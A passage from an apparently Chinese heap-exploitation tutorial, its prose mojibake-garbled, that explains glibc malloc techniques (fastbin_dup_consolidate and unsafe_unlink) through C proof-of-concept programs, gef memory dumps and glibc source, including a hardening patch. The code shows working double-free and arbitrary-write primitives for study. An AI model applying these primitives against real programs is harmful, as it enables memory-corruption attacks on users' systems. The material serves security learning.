<p>æ‰€ä»¥å¯¹äºŽ fastbinsï¼Œå¯ä»¥é€šè¿‡ double-free è¦†ç›– fastbins çš„ç»“æž„ï¼Œæ¥èŽ·å¾—ä¸€ä¸ªæŒ‡å‘ä»»æ„åœ°å€çš„æŒ‡é’ˆã€‚</p>
<h3 id="fastbin_dup_consolidate">fastbin_dup_consolidate</h3>
<pre><code class="language-c">#include &lt;stdio.h&gt;
#include &lt;stdint.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;

int main() {
    void *p1 = malloc(0x10);
    void *p2 = malloc(0x10);
    strcpy(p1, &quot;AAAAAAAA&quot;);
    strcpy(p2, &quot;BBBBBBBB&quot;);
    fprintf(stderr, &quot;Allocated two fastbins: p1=%p p2=%p\n&quot;, p1, p2);

    fprintf(stderr, &quot;Now free p1!\n&quot;);
    free(p1);

    void *p3 = malloc(0x400);
    fprintf(stderr, &quot;Allocated large bin to trigger malloc_consolidate(): p3=%p\n&quot;, p3);
    fprintf(stderr, &quot;In malloc_consolidate(), p1 is moved to the unsorted bin.\n&quot;);

    free(p1);
    fprintf(stderr, &quot;Trigger the double free vulnerability!\n&quot;);
    fprintf(stderr, &quot;We can pass the check in malloc() since p1 is not fast top.\n&quot;);

    void *p4 = malloc(0x10);
    strcpy(p4, &quot;CCCCCCC&quot;);
    void *p5 = malloc(0x10);
    strcpy(p5, &quot;DDDDDDDD&quot;);
    fprintf(stderr, &quot;Now p1 is in unsorted bin and fast bin. So we'will get it twice: %p %p\n&quot;, p4, p5);
}
$ gcc -g fastbin_dup_consolidate.c
$ ./a.out
Allocated two fastbins: p1=0x17c4010 p2=0x17c4030
Now free p1!
Allocated large bin to trigger malloc_consolidate(): p3=0x17c4050
In malloc_consolidate(), p1 is moved to the unsorted bin.
Trigger the double free vulnerability!
We can pass the check in malloc() since p1 is not fast top.
Now p1 is in unsorted bin and fast bin. So we'will get it twice: 0x17c4010 0x17c4010
</code></pre>
<p>è¿™ä¸ªç¨‹åºå±•ç¤ºäº†åˆ©ç”¨åœ¨ large bin çš„åˆ†é…ä¸­ malloc_consolidate æœºåˆ¶ç»•è¿‡ fastbin å¯¹ double free çš„æ£€æŸ¥ï¼Œè¿™ä¸ªæ£€æŸ¥åœ¨ fastbin_dup ä¸­å·²ç»å±•ç¤ºè¿‡äº†ï¼Œåªä¸è¿‡å®ƒåˆ©ç”¨çš„æ˜¯åœ¨ä¸¤æ¬¡ free ä¸­é—´æ’å…¥ä¸€æ¬¡å¯¹å…¶å®ƒ chunk çš„ freeã€‚</p>
<p>é¦–å…ˆåˆ†é…ä¸¤ä¸ª fast chunkï¼š</p>
<pre><code class="language-text">gefâž¤  x/15gx 0x602010-0x10
0x602000:   0x0000000000000000  0x0000000000000021  &lt;-- chunk p1
0x602010:   0x4141414141414141  0x0000000000000000
0x602020:   0x0000000000000000  0x0000000000000021  &lt;-- chunk p2
0x602030:   0x4242424242424242  0x0000000000000000
0x602040:   0x0000000000000000  0x0000000000020fc1  &lt;-- top chunk
0x602050:   0x0000000000000000  0x0000000000000000
0x602060:   0x0000000000000000  0x0000000000000000
0x602070:   0x0000000000000000
</code></pre>
<p>é‡Šæ”¾æŽ‰ p1ï¼Œåˆ™ç©ºé—² chunk åŠ å…¥åˆ° fastbins ä¸­ï¼š</p>
<pre><code class="language-text">gefâž¤  x/15gx 0x602010-0x10
0x602000:   0x0000000000000000  0x0000000000000021  &lt;-- chunk p1 [be freed]
0x602010:   0x0000000000000000  0x0000000000000000
0x602020:   0x0000000000000000  0x0000000000000021  &lt;-- chunk p2
0x602030:   0x4242424242424242  0x0000000000000000
0x602040:   0x0000000000000000  0x0000000000020fc1  &lt;-- top chunk
0x602050:   0x0000000000000000  0x0000000000000000
0x602060:   0x0000000000000000  0x0000000000000000
0x602070:   0x0000000000000000
gefâž¤  heap bins fast
[ Fastbins for arena 0x7ffff7dd1b20 ]
Fastbins[idx=0, size=0x10]  â†  Chunk(addr=0x602010, size=0x20, flags=PREV_INUSE)
</code></pre>
<p>æ­¤æ—¶å¦‚æžœæˆ‘ä»¬å†æ¬¡é‡Šæ”¾ p1ï¼Œå¿…ç„¶è§¦å‘ double free å¼‚å¸¸ï¼Œç„¶è€Œï¼Œå¦‚æžœæ­¤æ—¶åˆ†é…ä¸€ä¸ª large chunkï¼Œæ•ˆæžœå¦‚ä¸‹ï¼š</p>
<pre><code class="language-text">gefâž¤  x/15gx 0x602010-0x10
0x602000:   0x0000000000000000  0x0000000000000021  &lt;-- chunk p1 [be freed]
0x602010:   0x00007ffff7dd1b88  0x00007ffff7dd1b88      &lt;-- fd, bk pointer
0x602020:   0x0000000000000020  0x0000000000000020  &lt;-- chunk p2
0x602030:   0x4242424242424242  0x0000000000000000
0x602040:   0x0000000000000000  0x0000000000000411  &lt;-- chunk p3
0x602050:   0x0000000000000000  0x0000000000000000
0x602060:   0x0000000000000000  0x0000000000000000
0x602070:   0x0000000000000000
gefâž¤  heap bins fast
[ Fastbins for arena 0x7ffff7dd1b20 ]
Fastbins[idx=0, size=0x10] 0x00
gefâž¤  heap bins small
[ Small Bins for arena 'main_arena' ]
[+] small_bins[1]: fw=0x602000, bk=0x602000
 â†’   Chunk(addr=0x602010, size=0x20, flags=PREV_INUSE)
[+] Found 1 chunks in 1 small non-empty bins.
</code></pre>
<p>å¯ä»¥çœ‹åˆ° fastbins ä¸­çš„ chunk å·²ç»ä¸è§äº†ï¼Œåè€Œå‡ºçŽ°åœ¨äº† small bins ä¸­ï¼Œå¹¶ä¸” chunk p2 çš„ prev_size å’Œ size å­—æ®µéƒ½è¢«ä¿®æ”¹ã€‚</p>
<p>çœ‹ä¸€ä¸‹ large chunk çš„åˆ†é…è¿‡ç¨‹ï¼š</p>
<pre><code class="language-c">  /*
     If this is a large request, consolidate fastbins before continuing.
     While it might look excessive to kill all fastbins before
     even seeing if there is space available, this avoids
     fragmentation problems normally associated with fastbins.
     Also, in practice, programs tend to have runs of either small or
     large requests, but less often mixtures, so consolidation is not
     invoked all that often in most programs. And the programs that
     it is called frequently in otherwise tend to fragment.
   */

  else
    {
      idx = largebin_index (nb);
      if (have_fastchunks (av))
        malloc_consolidate (av);
    }
</code></pre>
<p>å½“åˆ†é… large chunk æ—¶ï¼Œé¦–å…ˆæ ¹æ® chunk çš„å¤§å°èŽ·å¾—å¯¹åº”çš„ large bin çš„ indexï¼ŒæŽ¥ç€åˆ¤æ–­å½“å‰åˆ†é…åŒºçš„ fast bins ä¸­æ˜¯å¦åŒ…å« chunkï¼Œå¦‚æžœæœ‰ï¼Œè°ƒç”¨ malloc_consolidate() å‡½æ•°åˆå¹¶ fast bins ä¸­çš„ chunkï¼Œå¹¶å°†è¿™äº›ç©ºé—² chunk åŠ å…¥ unsorted bin ä¸­ã€‚å› ä¸ºè¿™é‡Œåˆ†é…çš„æ˜¯ä¸€ä¸ª large chunkï¼Œæ‰€ä»¥ unsorted bin ä¸­çš„ chunk æŒ‰ç…§å¤§å°è¢«æ”¾å›ž small bins æˆ– large bins ä¸­ã€‚</p>
<p>ç”±äºŽæ­¤æ—¶ p1 å·²ç»ä¸åœ¨ fastbins çš„é¡¶éƒ¨ï¼Œå¯ä»¥å†æ¬¡é‡Šæ”¾ p1ï¼š</p>
<pre><code class="language-text">gefâž¤  x/15gx 0x602010-0x10
0x602000:   0x0000000000000000  0x0000000000000021  &lt;-- chunk p1 [double freed]
0x602010:   0x0000000000000000  0x00007ffff7dd1b88
0x602020:   0x0000000000000020  0x0000000000000020  &lt;-- chunk p2
0x602030:   0x4242424242424242  0x0000000000000000
0x602040:   0x0000000000000000  0x0000000000000411  &lt;-- chunk p3
0x602050:   0x0000000000000000  0x0000000000000000
0x602060:   0x0000000000000000  0x0000000000000000
0x602070:   0x0000000000000000
gefâž¤  heap bins fast
[ Fastbins for arena 0x7ffff7dd1b20 ]
Fastbins[idx=0, size=0x10]  â†  Chunk(addr=0x602010, size=0x20, flags=PREV_INUSE)
gefâž¤  heap bins small
[ Small Bins for arena 'main_arena' ]
[+] small_bins[1]: fw=0x602000, bk=0x602000
 â†’   Chunk(addr=0x602010, size=0x20, flags=PREV_INUSE)
[+] Found 1 chunks in 1 small non-empty bins.
</code></pre>
<p>p1 è¢«å†æ¬¡æ”¾å…¥ fastbinsï¼ŒäºŽæ˜¯ p1 åŒæ—¶å­˜åœ¨äºŽ fabins å’Œ small bins ä¸­ã€‚</p>
<p>ç¬¬ä¸€æ¬¡ mallocï¼Œchunk å°†ä»Ž fastbins ä¸­å–å‡ºï¼š</p>
<pre><code class="language-text">gefâž¤  x/15gx 0x602010-0x10
0x602000:   0x0000000000000000  0x0000000000000021  &lt;-- chunk p1 [be freed], chunk p4
0x602010:   0x0043434343434343  0x00007ffff7dd1b88
0x602020:   0x0000000000000020  0x0000000000000020  &lt;-- chunk p2
0x602030:   0x4242424242424242  0x0000000000000000
0x602040:   0x0000000000000000  0x0000000000000411  &lt;-- chunk p3
0x602050:   0x0000000000000000  0x0000000000000000
0x602060:   0x0000000000000000  0x0000000000000000
0x602070:   0x0000000000000000
gefâž¤  heap bins fast
[ Fastbins for arena 0x7ffff7dd1b20 ]
Fastbins[idx=0, size=0x10] 0x00
gefâž¤  heap bins small
[ Small Bins for arena 'main_arena' ]
[+] small_bins[1]: fw=0x602000, bk=0x602000
 â†’   Chunk(addr=0x602010, size=0x20, flags=PREV_INUSE)
[+] Found 1 chunks in 1 small non-empty bins.
</code></pre>
<p>ç¬¬äºŒæ¬¡ mallocï¼Œchunk ä»Ž small bins ä¸­å–å‡ºï¼š</p>
<pre><code class="language-text">gefâž¤  x/15gx 0x602010-0x10
0x602000:   0x0000000000000000  0x0000000000000021  &lt;-- chunk p4, chunk p5
0x602010:   0x4444444444444444  0x00007ffff7dd1b00
0x602020:   0x0000000000000020  0x0000000000000021  &lt;-- chunk p2
0x602030:   0x4242424242424242  0x0000000000000000
0x602040:   0x0000000000000000  0x0000000000000411  &lt;-- chunk p3
0x602050:   0x0000000000000000  0x0000000000000000
0x602060:   0x0000000000000000  0x0000000000000000
0x602070:   0x0000000000000000
</code></pre>
<p>chunk p4 å’Œ p5 åœ¨åŒä¸€ä½ç½®ã€‚</p>
<h3 id="unsafe_unlink">unsafe_unlink</h3>
<pre><code class="language-c">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;stdint.h&gt;

uint64_t *chunk0_ptr;

int main() {
    int malloc_size = 0x80; // not fastbins
    int header_size = 2;

    chunk0_ptr = (uint64_t*) malloc(malloc_size); //chunk0
    uint64_t *chunk1_ptr  = (uint64_t*) malloc(malloc_size); //chunk1
    fprintf(stderr, &quot;The global chunk0_ptr is at %p, pointing to %p\n&quot;, &amp;chunk0_ptr, chunk0_ptr);
    fprintf(stderr, &quot;The victim chunk we are going to corrupt is at %p\n\n&quot;, chunk1_ptr);

    // pass this check: (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False
    chunk0_ptr[2] = (uint64_t) &amp;chunk0_ptr-(sizeof(uint64_t)*3);
    chunk0_ptr[3] = (uint64_t) &amp;chunk0_ptr-(sizeof(uint64_t)*2);
    fprintf(stderr, &quot;Fake chunk fd: %p\n&quot;, (void*) chunk0_ptr[2]);
    fprintf(stderr, &quot;Fake chunk bk: %p\n\n&quot;, (void*) chunk0_ptr[3]);
    // pass this check: (chunksize(P) != prev_size (next_chunk(P)) == False
    // chunk0_ptr[1] = 0x0; // or 0x8, 0x80

    uint64_t *chunk1_hdr = chunk1_ptr - header_size;
    chunk1_hdr[0] = malloc_size;
    chunk1_hdr[1] &amp;= ~1;

    // deal with tcache
    // int *a[10];
    // int i;
    // for (i = 0; i &lt; 7; i++) {
    //   a[i] = malloc(0x80);
    // }
    // for (i = 0; i &lt; 7; i++) {
    //   free(a[i]);
    // }
    free(chunk1_ptr);

    char victim_string[9];
    strcpy(victim_string, &quot;AAAAAAAA&quot;);
    chunk0_ptr[3] = (uint64_t) victim_string;
    fprintf(stderr, &quot;Original value: %s\n&quot;, victim_string);

    chunk0_ptr[0] = 0x4242424242424242LL;
    fprintf(stderr, &quot;New Value: %s\n&quot;, victim_string);
}
$ gcc -g unsafe_unlink.c
$ ./a.out
The global chunk0_ptr is at 0x601070, pointing to 0x721010
The victim chunk we are going to corrupt is at 0x7210a0

Fake chunk fd: 0x601058
Fake chunk bk: 0x601060

Original value: AAAAAAAA
New Value: BBBBBBBB
</code></pre>
<p>è¿™ä¸ªç¨‹åºå±•ç¤ºäº†æ€Žæ ·åˆ©ç”¨ free æ”¹å†™å…¨å±€æŒ‡é’ˆ chunk0_ptr è¾¾åˆ°ä»»æ„å†…å­˜å†™çš„ç›®çš„ï¼Œå³ unsafe unlinkã€‚è¯¥æŠ€æœ¯æœ€å¸¸è§çš„åˆ©ç”¨åœºæ™¯æ˜¯æˆ‘ä»¬æœ‰ä¸€ä¸ªå¯ä»¥æº¢å‡ºæ¼æ´žå’Œä¸€ä¸ªå…¨å±€æŒ‡é’ˆã€‚</p>
<p>Ubuntu16.04 ä½¿ç”¨ libc-2.23ï¼Œå…¶ä¸­ unlink å®žçŽ°çš„ä»£ç å¦‚ä¸‹ï¼Œå…¶ä¸­æœ‰ä¸€äº›å¯¹å‰åŽå †å—çš„æ£€æŸ¥ï¼Œä¹Ÿæ˜¯æˆ‘ä»¬éœ€è¦ç»•è¿‡çš„ï¼š</p>
<pre><code class="language-c">/* Take a chunk off a bin list */
#define unlink(AV, P, BK, FD) {                                            \
    FD = P-&gt;fd;                                      \
    BK = P-&gt;bk;                                      \
    if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))              \
      malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P, AV);  \
    else {                                      \
        FD-&gt;bk = BK;                                  \
        BK-&gt;fd = FD;                                  \
        if (!in_smallbin_range (P-&gt;size)                      \
            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) {              \
        if (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0)          \
        || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0))    \
          malloc_printerr (check_action,                      \
                   &quot;corrupted double-linked list (not small)&quot;,    \
                   P, AV);                          \
            if (FD-&gt;fd_nextsize == NULL) {                      \
                if (P-&gt;fd_nextsize == P)                      \
                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;              \
                else {                                  \
                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;                  \
                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;                  \
                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;                  \
                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;                  \
                  }                                  \
              } else {                                  \
                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;              \
                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;              \
              }                                      \
          }                                      \
      }                                          \
}
</code></pre>
<p>åœ¨è§£é“¾æ“ä½œä¹‹å‰ï¼Œé’ˆå¯¹å †å— P è‡ªèº«çš„ fd å’Œ bk æ£€æŸ¥äº†é“¾è¡¨çš„å®Œæ•´æ€§ï¼Œå³åˆ¤æ–­å †å— P çš„å‰ä¸€å— fd çš„æŒ‡é’ˆæ˜¯å¦æŒ‡å‘ Pï¼Œä»¥åŠåŽä¸€å— bk çš„æŒ‡é’ˆæ˜¯å¦æŒ‡å‘ Pã€‚</p>
<p>malloc_size è®¾ç½®ä¸º 0x80ï¼Œå¯ä»¥åˆ†é… small chunkï¼Œç„¶åŽå®šä¹‰ header_size ä¸º 2ã€‚ç”³è¯·ä¸¤å—ç©ºé—´ï¼Œå…¨å±€æŒ‡é’ˆ <code>chunk0_ptr</code> æŒ‡å‘ chunk0ï¼Œå±€éƒ¨æŒ‡é’ˆ <code>chunk1_ptr</code> æŒ‡å‘ chunk1ï¼š</p>
<pre><code class="language-text">gefâž¤  p &amp;chunk0_ptr
$1 = (uint64_t **) 0x601070 &lt;chunk0_ptr&gt;
gefâž¤  x/gx &amp;chunk0_ptr
0x601070 &lt;chunk0_ptr&gt;:  0x0000000000602010
gefâž¤  p &amp;chunk1_ptr
$2 = (uint64_t **) 0x7fffffffdc60
gefâž¤  x/gx &amp;chunk1_ptr
0x7fffffffdc60: 0x00000000006020a0
gefâž¤  x/40gx 0x602010-0x10
0x602000:   0x0000000000000000  0x0000000000000091  &lt;-- chunk 0
0x602010:   0x0000000000000000  0x0000000000000000
0x602020:   0x0000000000000000  0x0000000000000000
0x602030:   0x0000000000000000  0x0000000000000000
0x602040:   0x0000000000000000  0x0000000000000000
0x602050:   0x0000000000000000  0x0000000000000000
0x602060:   0x0000000000000000  0x0000000000000000
0x602070:   0x0000000000000000  0x0000000000000000
0x602080:   0x0000000000000000  0x0000000000000000
0x602090:   0x0000000000000000  0x0000000000000091  &lt;-- chunk 1
0x6020a0:   0x0000000000000000  0x0000000000000000
0x6020b0:   0x0000000000000000  0x0000000000000000
0x6020c0:   0x0000000000000000  0x0000000000000000
0x6020d0:   0x0000000000000000  0x0000000000000000
0x6020e0:   0x0000000000000000  0x0000000000000000
0x6020f0:   0x0000000000000000  0x0000000000000000
0x602100:   0x0000000000000000  0x0000000000000000
0x602110:   0x0000000000000000  0x0000000000000000
0x602120:   0x0000000000000000  0x0000000000020ee1  &lt;-- top chunk
0x602130:   0x0000000000000000  0x0000000000000000
</code></pre>
<p>æŽ¥ä¸‹æ¥è¦ç»•è¿‡ <code>(P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False</code> çš„æ£€æŸ¥ï¼Œè¿™ä¸ªæ£€æŸ¥æœ‰ä¸ªç¼ºé™·ï¼Œå°±æ˜¯ fd/bk æŒ‡é’ˆéƒ½æ˜¯é€šè¿‡ä¸Ž chunk å¤´éƒ¨çš„ç›¸å¯¹åœ°å€æ¥æŸ¥æ‰¾çš„ã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨å…¨å±€æŒ‡é’ˆ <code>chunk0_ptr</code> æž„é€  fake chunk æ¥ç»•è¿‡å®ƒï¼š</p>
<pre><code class="language-text">gefâž¤  x/40gx 0x602010-0x10
0x602000:   0x0000000000000000  0x0000000000000091  &lt;-- chunk 0
0x602010:   0x0000000000000000  0x0000000000000000  &lt;-- fake chunk P
0x602020:   0x0000000000601058  0x0000000000601060      &lt;-- fd, bk pointer
0x602030:   0x0000000000000000  0x0000000000000000
0x602040:   0x0000000000000000  0x0000000000000000
0x602050:   0x0000000000000000  0x0000000000000000
0x602060:   0x0000000000000000  0x0000000000000000
0x602070:   0x0000000000000000  0x0000000000000000
0x602080:   0x0000000000000000  0x0000000000000000
0x602090:   0x0000000000000080  0x0000000000000090  &lt;-- chunk 1 &lt;-- prev_size
0x6020a0:   0x0000000000000000  0x0000000000000000
0x6020b0:   0x0000000000000000  0x0000000000000000
0x6020c0:   0x0000000000000000  0x0000000000000000
0x6020d0:   0x0000000000000000  0x0000000000000000
0x6020e0:   0x0000000000000000  0x0000000000000000
0x6020f0:   0x0000000000000000  0x0000000000000000
0x602100:   0x0000000000000000  0x0000000000000000
0x602110:   0x0000000000000000  0x0000000000000000
0x602120:   0x0000000000000000  0x0000000000020ee1  &lt;-- top chunk
0x602130:   0x0000000000000000  0x0000000000000000
gefâž¤  x/5gx 0x601058
0x601058:   0x0000000000000000  0x00007ffff7dd2540  &lt;-- fake chunk FD
0x601068:   0x0000000000000000  0x0000000000602010      &lt;-- bk pointer
0x601078:   0x0000000000000000
gefâž¤  x/5gx 0x601060
0x601060:   0x00007ffff7dd2540  0x0000000000000000  &lt;-- fake chunk BK
0x601070:   0x0000000000602010  0x0000000000000000      &lt;-- fd pointer
0x601080:   0x0000000000000000
</code></pre>
<p>å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬åœ¨ chunk0 é‡Œæž„é€ ä¸€ä¸ª fake chunkï¼Œç”¨ P è¡¨ç¤ºï¼Œä¸¤ä¸ªæŒ‡é’ˆ fd å’Œ bk å¯ä»¥æž„æˆä¸¤æ¡é“¾ï¼š<code>P-&gt;fd-&gt;bk == P</code>ï¼Œ<code>P-&gt;bk-&gt;fd == P</code>ï¼Œå¯ä»¥ç»•è¿‡æ£€æŸ¥ã€‚å¦å¤–åˆ©ç”¨ chunk0 çš„æº¢å‡ºæ¼æ´žï¼Œé€šè¿‡ä¿®æ”¹ chunk 1 çš„ <code>prev_size</code> ä¸º fake chunk çš„å¤§å°ï¼Œä¿®æ”¹ <code>PREV_INUSE</code> æ ‡å¿—ä½ä¸º 0ï¼Œå°† fake chunk ä¼ªé€ æˆä¸€ä¸ª free chunkã€‚</p>
<p>æŽ¥ä¸‹æ¥å°±æ˜¯é‡Šæ”¾æŽ‰ chunk1ï¼Œè¿™ä¼šè§¦å‘ fake chunk çš„ unlink å¹¶è¦†ç›– <code>chunk0_ptr</code> çš„å€¼ã€‚unlink æ“ä½œæ˜¯è¿™æ ·è¿›è¡Œçš„ï¼š</p>
<pre><code class="language-c">FD = P-&gt;fd;
BK = P-&gt;bk;
FD-&gt;bk = BK
BK-&gt;fd = FD
</code></pre>
<p>æ ¹æ® fd å’Œ bk æŒ‡é’ˆåœ¨ malloc_chunk ç»“æž„ä½“ä¸­çš„ä½ç½®ï¼Œè¿™æ®µä»£ç ç­‰ä»·äºŽï¼š</p>
<pre><code class="language-text">FD = P-&gt;fd = &amp;P - 24
BK = P-&gt;bk = &amp;P - 16
FD-&gt;bk = *(&amp;P - 24 + 24) = P
FD-&gt;fd = *(&amp;P - 16 + 16) = P
</code></pre>
<p>è¿™æ ·å°±é€šè¿‡äº† unlink çš„æ£€æŸ¥ï¼Œæœ€ç»ˆæ•ˆæžœä¸ºï¼š</p>
<pre><code class="language-text">FD-&gt;bk = P = BK = &amp;P - 16
BK-&gt;fd = P = FD = &amp;P - 24
</code></pre>
<p>åŽŸæœ¬æŒ‡å‘å †ä¸Š fake chunk çš„æŒ‡é’ˆ P æŒ‡å‘äº†è‡ªèº«åœ°å€å‡ 24 çš„ä½ç½®ï¼Œè¿™å°±æ„å‘³ç€å¦‚æžœç¨‹åºåŠŸèƒ½å…è®¸å † P è¿›è¡Œå†™å…¥ï¼Œå°±èƒ½æ”¹å†™ P æŒ‡é’ˆè‡ªèº«çš„åœ°å€ï¼Œä»Žè€Œé€ æˆä»»æ„å†…å­˜å†™å…¥ã€‚è‹¥å…è®¸å † P è¿›è¡Œè¯»å–ï¼Œåˆ™ä¼šé€ æˆä¿¡æ¯æ³„æ¼ã€‚</p>
<p>åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œç”±äºŽ P-&gt;fd-&gt;bk å’Œ P-&gt;bk-&gt;fd éƒ½æŒ‡å‘ Pï¼Œæ‰€ä»¥æœ€åŽçš„ç»“æžœä¸ºï¼š</p>
<pre><code class="language-text">chunk0_ptr = P = P-&gt;fd
</code></pre>
<p>æˆåŠŸåœ°ä¿®æ”¹äº† chunk0_ptrï¼Œè¿™æ—¶ <code>chunk0_ptr</code> å’Œ <code>chunk0_ptr[3]</code> å®žé™…ä¸Šå°±æ˜¯åŒä¸€ä¸œè¥¿ã€‚è¿™é‡Œå¯èƒ½ä¼šæœ‰ç–‘æƒ‘ä¸ºä»€ä¹ˆè¿™ä¸¤ä¸ªä¸œè¥¿æ˜¯ä¸€æ ·çš„ï¼Œå› ä¸º <code>chunk0_ptr</code> æŒ‡é’ˆåœ¨æ˜¯æ”¾åœ¨æ•°æ®æ®µä¸Šçš„ï¼Œåœ°å€åœ¨ <code>0x601070</code>ï¼ŒæŒ‡å‘ <code>0x601058</code>ï¼Œè€Œ <code>chunk0_ptr[3]</code> çš„æ„æ€æ˜¯ä»Ž <code>chunk0_ptr</code> æŒ‡å‘çš„åœ°æ–¹å¼€å§‹æ•° 3 ä¸ªå•ä½ï¼Œæ‰€ä»¥ <code>0x601058+0x08*3=0x601070</code>ï¼š</p>
<pre><code class="language-text">gefâž¤  x/40gx 0x602010-0x10
0x602000:   0x0000000000000000  0x0000000000000091  &lt;-- chunk 0
0x602010:   0x0000000000000000  0x0000000000020ff1  &lt;-- fake chunk P
0x602020:   0x0000000000601058  0x0000000000601060      &lt;-- fd, bk pointer
0x602030:   0x0000000000000000  0x0000000000000000
0x602040:   0x0000000000000000  0x0000000000000000
0x602050:   0x0000000000000000  0x0000000000000000
0x602060:   0x0000000000000000  0x0000000000000000
0x602070:   0x0000000000000000  0x0000000000000000
0x602080:   0x0000000000000000  0x0000000000000000
0x602090:   0x0000000000000080  0x0000000000000090  &lt;-- chunk 1 [be freed]
0x6020a0:   0x0000000000000000  0x0000000000000000
0x6020b0:   0x0000000000000000  0x0000000000000000
0x6020c0:   0x0000000000000000  0x0000000000000000
0x6020d0:   0x0000000000000000  0x0000000000000000
0x6020e0:   0x0000000000000000  0x0000000000000000
0x6020f0:   0x0000000000000000  0x0000000000000000
0x602100:   0x0000000000000000  0x0000000000000000
0x602110:   0x0000000000000000  0x0000000000000000
0x602120:   0x0000000000000000  0x0000000000020ee1  &lt;-- top chunk
0x602130:   0x0000000000000000  0x0000000000000000
gefâž¤  x/5gx 0x601058
0x601058:   0x0000000000000000  0x00007ffff7dd2540  &lt;-- fake chunk FD
0x601068:   0x0000000000000000  0x0000000000601058      &lt;-- bk pointer
0x601078:   0x0000000000000000
gefâž¤  x/5gx 0x601060
0x601060:   0x00007ffff7dd2540  0x0000000000000000  &lt;-- fake chunk BK
0x601070:   0x0000000000601058  0x0000000000000000      &lt;-- fd pointer
0x601080:   0x0000000000000000
gefâž¤  x/gx chunk0_ptr
0x601058:   0x0000000000000000
gefâž¤  x/gx chunk0_ptr[3]
0x601058:   0x0000000000000000
</code></pre>
<p>æ‰€ä»¥ï¼Œä¿®æ”¹ <code>chunk0_ptr[3]</code> å°±ç­‰äºŽä¿®æ”¹ <code>chunk0_ptr</code>ï¼š</p>
<pre><code class="language-text">gefâž¤  x/5gx 0x601058
0x601058:   0x0000000000000000  0x00007ffff7dd2540
0x601068:   0x0000000000000000  0x00007fffffffdc70  &lt;-- chunk0_ptr[3]
0x601078:   0x0000000000000000
gefâž¤  x/gx chunk0_ptr
0x7fffffffdc70: 0x4141414141414141
</code></pre>
<p>è¿™æ—¶ <code>chunk0_ptr</code> å°±æŒ‡å‘äº† victim_stringï¼Œä¿®æ”¹å®ƒï¼š</p>
<pre><code class="language-text">gefâž¤  x/gx chunk0_ptr
0x7fffffffdc70: 0x4242424242424242
</code></pre>
<p>æˆåŠŸè¾¾æˆä¿®æ”¹ä»»æ„åœ°å€çš„æˆå°±ã€‚</p>
<p>æœ€åŽçœ‹ä¸€ç‚¹æ–°çš„ä¸œè¥¿ï¼Œlibc-2.25 åœ¨ unlink çš„å¼€å¤´å¢žåŠ äº†å¯¹ <code>chunk_size == next-&gt;prev-&gt;chunk_size</code> çš„æ£€æŸ¥ï¼Œä»¥å¯¹æŠ—å•å­—èŠ‚æº¢å‡ºçš„é—®é¢˜ã€‚è¡¥ä¸å¦‚ä¸‹ï¼š</p>
<pre><code class="language-diff">$ git show 17f487b7afa7cd6c316040f3e6c86dc96b2eec30 malloc/malloc.c
commit 17f487b7afa7cd6c316040f3e6c86dc96b2eec30
Author: DJ Delorie &lt;dj@delorie.com&gt;
Date:   Fri Mar 17 15:31:38 2017 -0400

    Further harden glibc malloc metadata against 1-byte overflows.

    Additional check for chunk_size == next-&gt;prev-&gt;chunk_size in unlink()

    2017-03-17  Chris Evans  &lt;scarybeasts@gmail.com&gt;

            * malloc/malloc.c (unlink): Add consistency check between size and
            next-&gt;prev-&gt;size, to further harden against 1-byte overflows.

diff --git a/malloc/malloc.c b/malloc/malloc.c
index e29105c372..994a23248e 100644
--- a/malloc/malloc.c
+++ b/malloc/malloc.c
@@ -1376,6 +1376,8 @@ typedef struct malloc_chunk *mbinptr;

 /* Take a chunk off a bin list */
 #define unlink(AV, P, BK, FD) {                                            \
+    if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \
+      malloc_printerr (check_action, &quot;corrupted size vs. prev_size&quot;, P, AV);  \
     FD = P-&gt;fd;                                                                      \
     BK = P-&gt;bk;                                                                      \
     if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))                    \
</code></pre>
<p>å…·ä½“æ˜¯è¿™æ ·çš„ï¼š</p>
<pre><code class="language-c">/* Ptr to next physical malloc_chunk. */
#define next_chunk(p) ((mchunkptr) (((char *) (p)) + chunksize (p)))
/* Get size, ignoring use bits */
#define chunksize(p) (chunksize_nomask (p) &amp; ~(SIZE_BITS))
/* Like chunksize, but do not mask SIZE_BITS.  */
#define chunksize_nomask(p)         ((p)-&gt;mchunk_size)
/* Size of the chunk below P.  Only valid if prev_inuse (P).  */
#define prev_size(p) ((p)-&gt;mchunk_prev_size)
/* Bits to mask off when extracting size  */
#define SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
</code></pre>
<p>å›žé¡¾ä¸€ä¸‹ä¼ªé€ å‡ºæ¥çš„å †ï¼š</p>
<pre><code class="language-text">gefâž¤  x/40gx 0x602010-0x10
0x602000:   0x0000000000000000  0x0000000000000091  &lt;-- chunk 0
0x602010:   0x0000000000000000  0x0000000000000000  &lt;-- fake chunk P
0x602020:   0x0000000000601058  0x0000000000601060      &lt;-- fd, bk pointer
0x602030:   0x0000000000000000  0x0000000000000000
0x602040:   0x0000000000000000  0x0000000000000000
0x602050:   0x0000000000000000  0x0000000000000000
0x602060:   0x0000000000000000  0x0000000000000000
0x602070:   0x0000000000000000  0x0000000000000000
0x602080:   0x0000000000000000  0x0000000000000000
